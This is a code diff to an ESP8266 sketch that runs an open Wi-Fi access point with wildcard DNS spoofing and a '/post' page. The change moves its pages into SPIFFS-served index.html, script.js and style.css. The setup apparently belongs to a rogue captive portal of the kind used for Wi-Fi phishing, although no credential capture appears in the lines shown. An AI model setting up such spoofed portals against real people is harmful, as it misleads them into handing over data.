@@ -2,7 +2,6 @@
 #include <DNSServer.h>
 #include <ESP8266WebServer.h>
 #include <FS.h>
-#include <LittleFS.h>
 #include <pgmspace.h>
 
 // User configuration
@@ -54,10 +53,6 @@ String footer() {
   return "</body></html>";
 }
 
-String index() {
-  return header(WEB_TITLE) + footer();
-}
-
 String posted() {
   return header(POST_TITLE) + footer();
 }
@@ -76,7 +71,13 @@ void setup() {
   WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
   WiFi.softAP(SSID_NAME);
   dnsServer.start(DNS_PORT, "*", APIP);  // DNS spoofing (Only HTTP)
-  
+
+  // Initialize SPIFFS
+  if (!SPIFFS.begin()) {
+    Serial.println("Failed to mount SPIFFS! Make sure you have uploaded the files.");
+    return;
+  }
+
   webServer.on("/post", []() {
     webServer.send(HTTP_CODE, "text/html", posted());
   });
@@ -87,10 +88,27 @@ void setup() {
     webServer.send(HTTP_CODE, "text/html", clear());
   });
 
-  // Serve the index file
+  // Serve specific static files
+  webServer.on("/script.js", []() {
+    File file = SPIFFS.open("/script.js", "r");
+    webServer.streamFile(file, "application/javascript");
+    file.close();
+  });
+  webServer.on("/style.css", []() {
+    File file = SPIFFS.open("/style.css", "r");
+    webServer.streamFile(file, "text/css");
+    file.close();
+  });
+
   webServer.onNotFound([]() {
-    Serial.println("Sending web page...");
-    webServer.send(200, "text/html", index());
+    String path = webServer.uri();
+    if (path == "/" || !path.endsWith(".js") && !path.endsWith(".css")) {
+      File file = SPIFFS.open("/index.html", "r");
+      webServer.send(201, "text/html", file.readString());
+      file.close();
+    } else {
+      webServer.send(404, "text/plain", "404: File Not Found");
+    }
   });
 
   webServer.begin();
